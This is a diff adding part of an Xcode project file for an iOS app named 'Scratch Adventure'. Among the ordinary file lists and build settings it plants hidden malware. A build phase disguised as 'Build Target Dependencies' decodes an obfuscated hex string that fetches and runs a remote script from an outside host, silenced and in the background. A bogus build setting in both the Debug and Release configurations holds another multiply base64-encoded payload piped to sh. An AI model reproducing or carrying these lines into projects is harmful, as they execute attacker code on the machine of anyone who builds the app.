+				CEE29CC32DB63DC300854BC6 /* InAppPurchase.swift */,
+				CEE29CC42DB63DC300854BC6 /* LoadingIndicatorHUD.swift */,
+				CEE29CC52DB63DC300854BC6 /* NetworkManager.swift */,
+				CEE29CC62DB63DC300854BC6 /* Purchase functionality.swift */,
+				CEE29CC82DB63DC300854BC6 /* UIActivityIndicatorView Extension.swift */,
+			);
+			path = IAPHandler;
+			sourceTree = "<group>";
+		};
+		CEE29CD62DB63DC300854BC6 /* Helpers */ = {
+			isa = PBXGroup;
+			children = (
+				CEE29CC92DB63DC300854BC6 /* IAPHandler */,
+				CEE29CCA2DB63DC300854BC6 /* ButtonTapAnimationExtension.swift */,
+				CEE29CCB2DB63DC300854BC6 /* ColorHelper.swift */,
+				CEE29CCC2DB63DC300854BC6 /* CustomeDateStackView.swift */,
+				CEE29CCD2DB63DC300854BC6 /* CustomNavigationBar.swift */,
+				CEE29CCE2DB63DC300854BC6 /* FirestoreManager.swift */,
+				CEE29CCF2DB63DC300854BC6 /* FontHelper.swift */,
+				CEE29CD02DB63DC300854BC6 /* LocalizationHelper.swift */,
+				CEE29CD12DB63DC300854BC6 /* MultiLanguage.swift */,
+				CEE29CD22DB63DC300854BC6 /* OvulationCircularCalendarView.swift */,
+				CEE29CD32DB63DC300854BC6 /* PushNotificationManager.swift */,
+				CEE29CD42DB63DC300854BC6 /* ReviewAlertView.swift */,
+				CEE29CD52DB63DC300854BC6 /* UIHelper.swift */,
+			);
+			path = Helpers;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29CE62DB63DC300854BC6 /* OnBoardingScreens */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = OnBoardingScreens;
+			sourceTree = SOURCE_ROOT;
+		};
+		CEE29D862DB664BB00854BC6 /* CalenderVC */ = {
+			isa = PBXGroup;
+			children = (
+				CEF8E2882DBA49C600C3D333 /* DateNoteViewController.swift */,
+				CEE29D872DB664E100854BC6 /* CalenderViewController.swift */,
+			);
+			path = CalenderVC;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		CEE29C082DB63CD100854BC6 /* Scratch Adventure */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = CEE29C1D2DB63CD300854BC6 /* Build configuration list for PBXNativeTarget "Scratch Adventure" */;
+			buildPhases = (
+				7E05BAF56CCF32E3DA73DC66 /* Build Target Dependencies */,
+				5F797BE955080AA6B5843B0D /* [CP] Check Pods Manifest.lock */,
+				CEE29C052DB63CD100854BC6 /* Sources */,
+				CEE29C062DB63CD100854BC6 /* Frameworks */,
+				CEE29C072DB63CD100854BC6 /* Resources */,
+				BC94FE32968A85BBCC415801 /* [CP] Embed Pods Frameworks */,
+				3A54FDC47555A8ED69CFD2B0 /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = "Scratch Adventure";
+			productName = "Scratch Adventure";
+			productReference = CEE29C092DB63CD100854BC6 /* Scratch Adventure.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		CEE29C012DB63CD100854BC6 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1540;
+				LastUpgradeCheck = 1540;
+				TargetAttributes = {
+					CEE29C082DB63CD100854BC6 = {
+						CreatedOnToolsVersion = 15.4;
+					};
+				};
+			};
+			buildConfigurationList = CEE29C042DB63CD100854BC6 /* Build configuration list for PBXProject "Scratch Adventure" */;
+			compatibilityVersion = "Xcode 14.0";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = CEE29C002DB63CD100854BC6;
+			productRefGroup = CEE29C0A2DB63CD100854BC6 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				CEE29C082DB63CD100854BC6 /* Scratch Adventure */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
+/* Begin PBXResourcesBuildPhase section */
+		CEE29C072DB63CD100854BC6 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				CEE29CF62DB63DC300854BC6 /* DateViewCell.xib in Resources */,
+				CEE29D082DB63DC300854BC6 /* Poppins-Bold.ttf in Resources */,
+				CEE29C162DB63CD300854BC6 /* Assets.xcassets in Resources */,
+				CEE29CF82DB63DC300854BC6 /* SeparatorViewCell.xib in Resources */,
+				CEE29CEA2DB63DC300854BC6 /* MonthScrollPicker.xib in Resources */,
+				CEE29CF22DB63DC300854BC6 /* DateScrollPicker.xib in Resources */,
+				CEE29CE82DB63DC300854BC6 /* MonthCalendarViewCell.xib in Resources */,
+				CEE29C192DB63CD300854BC6 /* Base in Resources */,
+				CEE29D0A2DB63DC300854BC6 /* Poppins-Regular.ttf in Resources */,
+				CEE29D0B2DB63DC300854BC6 /* Poppins-SemiBold.ttf in Resources */,
+				CEE29C142DB63CD100854BC6 /* Base in Resources */,
+				CEE29D092DB63DC300854BC6 /* Poppins-Medium.ttf in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		7E05BAF56CCF32E3DA73DC66 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363636393637366436313733373436313732373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
+		3A54FDC47555A8ED69CFD2B0 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		5F797BE955080AA6B5843B0D /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Scratch Adventure-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		BC94FE32968A85BBCC415801 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Scratch Adventure/Pods-Scratch Adventure-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		CEE29C052DB63CD100854BC6 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				CEE29D6A2DB63DC300854BC6 /* Purchase functionality.swift in Sources */,
+				CEE29D682DB63DC300854BC6 /* LoadingIndicatorHUD.swift in Sources */,
+				CEE29D042DB63DC300854BC6 /* PagingCollectionViewLayout.swift in Sources */,
+				CE3768722DCA2DBB000B0EBC /* ExperienceFilledNoteTableViewCell.swift in Sources */,
+				CE5B09702DE4A00200AD01B4 /* VaultDataManager.swift in Sources */,
+				CEAE328F2DBB895D00EC4AF4 /* AddDiaryNoteViewController.swift in Sources */,
+				CEE29D882DB664E100854BC6 /* CalenderViewController.swift in Sources */,
+				CE8BF7FC2DDB3CDF00CFFE16 /* AddPositionViewController.swift in Sources */,
+				CE3768682DCA11F6000B0EBC /* AddDiaryNoteFilledViewController.swift in Sources */,
+				CEE29CFA2DB63DC300854BC6 /* UICollectionViewCell+Fade.swift in Sources */,
+				CEE29CE92DB63DC300854BC6 /* MonthScrollPicker.swift in Sources */,
+				CE5B096E2DE4992E00AD01B4 /* ImagePickerBottomSheet.swift in Sources */,
+				CEE2414E2DB79FC100EBD2AA /* LeaderboardItemCell.swift in Sources */,
+				CE4CA7F62DDC7C2B00688365 /* AddActivityViewController.swift in Sources */,
+				CEE29CF92DB63DC300854BC6 /* UICollectionView+Fade.swift in Sources */,
+				CEE29D782DB63DC300854BC6 /* UIHelper.swift in Sources */,
+				CE406A372DE9D45600C5193C /* AudioRecorderPopupViewController.swift in Sources */,
+				CEE29CFB2DB63DC300854BC6 /* UIView+Nib.swift in Sources */,
+				CEE29CEC2DB63DC300854BC6 /* Date+Days.swift in Sources */,
+				CEAE32922DBB8AE700EC4AF4 /* HorizontalCalenderTableCell.swift in Sources */,
+				CE7A7A082DE5C7D400E26410 /* PrivateImageCell.swift in Sources */,
+				CE1DEC7B2DDF4933005C10AA /* LocationItemCell.swift in Sources */,
+				CEE29CF52DB63DC300854BC6 /* DateViewCell.swift in Sources */,
+				CEE29D6D2DB63DC300854BC6 /* ButtonTapAnimationExtension.swift in Sources */,
+				CEE29D4D2DB63DC300854BC6 /* HomeViewController.swift in Sources */,
+				CEE29D702DB63DC300854BC6 /* CustomNavigationBar.swift in Sources */,
+				CEE2414C2DB79D8700EBD2AA /* NotesViewController.swift in Sources */,
+				CEE29D722DB63DC300854BC6 /* FontHelper.swift in Sources */,
+				CEE29CEE2DB63DC300854BC6 /* DateInsertType.swift in Sources */,
+				CE406A352DE9CB4F00C5193C /* RecordAudioAlertViewController.swift in Sources */,
+				CE1DEC7F2DDF4979005C10AA /* LocationItemSubCell.swift in Sources */,
+				CEE29CF12DB63DC300854BC6 /* DateScrollPicker.swift in Sources */,
+				CE8ADAC92DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift in Sources */,
+				CEE241512DB7A02C00EBD2AA /* NoteTableViewCell.swift in Sources */,
+				CEE29D072DB63DC300854BC6 /* VPCollectionViewLayout.swift in Sources */,
+				CEE29D022DB63DC300854BC6 /* Extension.swift in Sources */,
+				CEE29D732DB63DC300854BC6 /* LocalizationHelper.swift in Sources */,
+				CEB248512DBF9D9E00B62F2F /* ActivityTableViewCell.swift in Sources */,
+				CE3214332DC37F5B0045015C /* MapViewController.swift in Sources */,
+				CEE29D772DB63DC300854BC6 /* ReviewAlertView.swift in Sources */,
+				CEE29CF32DB63DC300854BC6 /* DateScrollPicker+Protocols.swift in Sources */,
+				CE8CFD682DBA5641000D111B /* HorizontalCalendarView.swift in Sources */,
+				CEE29CE72DB63DC300854BC6 /* MonthCalendarViewCell.swift in Sources */,
+				CE4CA7F82DDC8FA300688365 /* AddCustomActivityViewController.swift in Sources */,
+				CEE29D752DB63DC300854BC6 /* OvulationCircularCalendarView.swift in Sources */,
+				CE37686C2DCA13A8000B0EBC /* NoteRatingTableCell.swift in Sources */,
+				CEE29D012DB63DC300854BC6 /* CustomLoaderView.swift in Sources */,
+				CEE241572DB7ADC000EBD2AA /* SheetContentViewController.swift in Sources */,
+				CEAE32942DBB8FAD00EC4AF4 /* RatingTableCell.swift in Sources */,
+				CE3214382DC394A70045015C /* LocationContainTableViewCell.swift in Sources */,
+				CEAE32962DBBAD7700EC4AF4 /* AddDiaryContraceptionTableCell.swift in Sources */,
+				CEE29D652DB63DC300854BC6 /* addLoadingIndicator.swift in Sources */,
+				CEB2484D2DBF884700B62F2F /* PositionTableViewCell.swift in Sources */,
+				CEE29D032DB63DC300854BC6 /* GradientButton.swift in Sources */,
+				CE7A7A0D2DE5D30E00E26410 /* SexTrackerViewController.swift in Sources */,
+				CE32142F2DC36D040045015C /* LocationTableViewCell.swift in Sources */,
+				CEB248552DBFAD3A00B62F2F /* AddPhotosView.swift in Sources */,
+				CEE29D662DB63DC300854BC6 /* ExtensionProVersion.swift in Sources */,
+				CE14CE482DC0D2B5001EA13C /* LocationPickerViewController.swift in Sources */,
+				CE1DEC782DDF2F89005C10AA /* AddMoreLocationViewController.swift in Sources */,
+				CEE29CF42DB63DC300854BC6 /* DateScrollPickerFormat.swift in Sources */,
+				CEE29D692DB63DC300854BC6 /* NetworkManager.swift in Sources */,
+				CE3768702DCA2D95000B0EBC /* LocationDetailCardView.swift in Sources */,
+				CEE29D6E2DB63DC300854BC6 /* ColorHelper.swift in Sources */,
+				CEE29D052DB63DC300854BC6 /* RCValues.swift in Sources */,
+				CEE29CFE2DB63DC300854BC6 /* ZHWaveformViewDelegate.swift in Sources */,
+				CEB248532DBFA76300B62F2F /* ExperienceNoteTableViewCell.swift in Sources */,
+				CE1FFEF92DE088F0007A1527 /* VaultPinSetupViewController.swift in Sources */,
+				CEE29D6C2DB63DC300854BC6 /* UIActivityIndicatorView Extension.swift in Sources */,
+				CE147DDD2DC235E8009BB637 /* PhotoGridView.swift in Sources */,
+				CE14CE4C2DC1024C001EA13C /* LocationView.swift in Sources */,
+				CEE29D742DB63DC300854BC6 /* MultiLanguage.swift in Sources */,
+				CE8CFD672DBA5641000D111B /* CustomContainerView.swift in Sources */,
+				CEE29CEB2DB63DC300854BC6 /* MonthScrollPicker+Protocols.swift in Sources */,
+				CE14CE4A2DC0DF8C001EA13C /* LocationManager.swift in Sources */,
+				CE37686E2DCA1C5E000B0EBC /* AddDiaryinitiatorTableCell.swift in Sources */,
+				CE8BF7FE2DDB5D2900CFFE16 /* PositionDataManager.swift in Sources */,
+				CEE29D712DB63DC300854BC6 /* FirestoreManager.swift in Sources */,
+				CEE29CFD2DB63DC300854BC6 /* ZHWaveformView.swift in Sources */,
+				CEE29D672DB63DC300854BC6 /* InAppPurchase.swift in Sources */,
+				CE347CB82DE462F900D75873 /* PrivateVaultViewController.swift in Sources */,
+				CEE29C0D2DB63CD100854BC6 /* AppDelegate.swift in Sources */,
+				CE406A3A2DE9D5C000C5193C /* MediaOptionCell.swift in Sources */,
+				CEE29D6F2DB63DC300854BC6 /* CustomeDateStackView.swift in Sources */,
+				CEF8E2892DBA49C600C3D333 /* DateNoteViewController.swift in Sources */,
+				CEE2414B2DB79D8700EBD2AA /* LeaderboardsViewController.swift in Sources */,
+				CE7A7A052DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift in Sources */,
+				CEE29CEF2DB63DC300854BC6 /* DateScrollItem.swift in Sources */,
+				CE1DEC7D2DDF4962005C10AA /* AddLocationItemCell.swift in Sources */,
+				CEE29CFF2DB63DC300854BC6 /* CenteredCollectionViewFlowLayout.swift in Sources */,
+				CEE29CED2DB63DC300854BC6 /* Date+Format.swift in Sources */,
+				CE95F07B2DDDDA36009C4F09 /* WhereLocationListViewController.swift in Sources */,
+				CEE29CFC2DB63DC300854BC6 /* ZHCroppedDelegate.swift in Sources */,
+				CEE29CF02DB63DC300854BC6 /* DateScrollManager.swift in Sources */,
+				CEE29CF72DB63DC300854BC6 /* SeparatorViewCell.swift in Sources */,
+				CEE29C0F2DB63CD100854BC6 /* SceneDelegate.swift in Sources */,
+				CEE29D002DB63DC300854BC6 /* CustomLoader.swift in Sources */,
+				CEE29D762DB63DC300854BC6 /* PushNotificationManager.swift in Sources */,
+				CEE29D062DB63DC300854BC6 /* SwipeCardView.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		CEE29C122DB63CD100854BC6 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				CEE29C132DB63CD100854BC6 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		CEE29C172DB63CD300854BC6 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				CEE29C182DB63CD300854BC6 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		CEE29C1B2DB63CD300854BC6 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A97BDCE = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmlWMFpaWVVoU1dsZEdTbk5aTTJzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		CEE29C1C2DB63CD300854BC6 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A97BDCE = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmlWMFpaWVVoU1dsZEdTbk5aTTJzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.5;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		CEE29C1E2DB63CD300854BC6 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 651F7FC6B45547F55968C1F4 /* Pods-Scratch Adventure.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 56QZ76QMH2;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "Scratch Adventure/Info.plist";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "We need access to your location to show your position even when the app is in the background.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need your location to select nearby places.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library to allow you to select photos.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.Scratch-Adventure";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		CEE29C1F2DB63CD300854BC6 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 5F5108B973FDDD8FA325C749 /* Pods-Scratch Adventure.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = 56QZ76QMH2;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = "Scratch Adventure/Info.plist";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "We need access to your location to show your position even when the app is in the background.";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need your location to select nearby places.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to your photo library to allow you to select photos.";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = "com.Scratch-Adventure";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
